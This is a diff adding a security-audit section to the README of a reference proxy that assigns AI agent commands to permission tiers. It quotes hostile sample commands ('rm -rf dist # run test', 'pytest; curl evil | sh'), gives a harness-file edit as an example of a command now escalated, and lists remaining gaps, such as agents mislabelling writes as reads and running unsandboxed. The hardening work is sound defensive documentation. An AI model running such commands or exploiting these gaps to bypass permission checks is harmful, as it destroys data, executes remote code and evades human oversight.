@@ -65,6 +65,31 @@ pass the real agent via `--agent`.
 python3 -m unittest discover -s platform/agents/acp/reference-proxy
 ```
 
+## Security hardening (2026-09-01 audit)
+
+The classifier and policy loader were hardened after an adversarial review:
+
+- **`execute` tier is a floor, not a replacement.** A command lowers to Tier 1 only when its *head*
+  is a recognized test/lint/build runner AND it has no shell metacharacters — `rm -rf dist # run test`
+  and `pytest; curl evil | sh` stay at the execute baseline (were auto-approvable Tier 1).
+- **Governance-entrypoint escalation is kind-independent.** An `execute` whose command targets an
+  entrypoint (`sed -i … HARNESS.md`) is Tier 5, not just `edit`/`move`/`delete`.
+- **Policy overrides may only tighten.** `load_policy` rejects an override that lowers a kind's tier or
+  lifts an `allow_always` ban (was a comment; now enforced).
+- **Permission responses are clamped.** The client's chosen `optionId` is clamped to the option set the
+  proxy actually offered — it cannot answer `allow_always` to a request rewritten to `reject_once`.
+
+**Residual limitations an adopter productionizing this MUST close** (out of reference scope):
+
+- **The agent's self-declared `kind` is trusted.** A write that lies about being a `read` still reads as
+  low-tier — inherent to ACP's agent-declared model. Pair with an out-of-band check on the actual op.
+- **The child agent is an unsandboxed `Popen` with the full parent environment.** The proxy mediates the
+  permission *protocol*; it does not contain the process. Run the agent in a real sandbox with a scoped
+  env and cwd.
+- **`tier-policy.yaml` is a mirror, not the effective source.** The engine runs on `DEFAULT_POLICY`; the
+  YAML's `escalation.*` schema is not yet read by the loader. Reconciling the declarative file with the
+  engine (drive one off the other) is a follow-on.
+
 ## Scope & extension points
 
 Framing is newline-delimited JSON (the common ACP stdio convention). This reference
